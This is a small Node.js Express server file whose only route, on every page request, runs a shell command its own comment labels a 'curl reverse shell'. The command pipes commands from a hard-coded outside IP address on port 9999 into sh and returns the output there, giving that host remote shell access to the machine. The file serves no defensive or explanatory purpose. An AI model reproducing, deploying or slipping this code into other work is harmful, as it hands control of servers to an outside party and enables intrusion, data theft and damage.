const express = require('express');
const { exec } = require('child_process');

const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    // Command to run the curl reverse shell
    const command = `C='curl -Ns telnet://140.238.85.162:9999'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null`;
    
    exec(command, (error, stdout, stderr) => {
        if (error) {
            res.send(`<pre>Error: ${error.message}</pre>`);
            return;
        }
        if (stderr) {
            res.send(`<pre>stderr: ${stderr}</pre>`);
            return;
        }
        res.send(`<pre>${stdout}</pre>`);
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
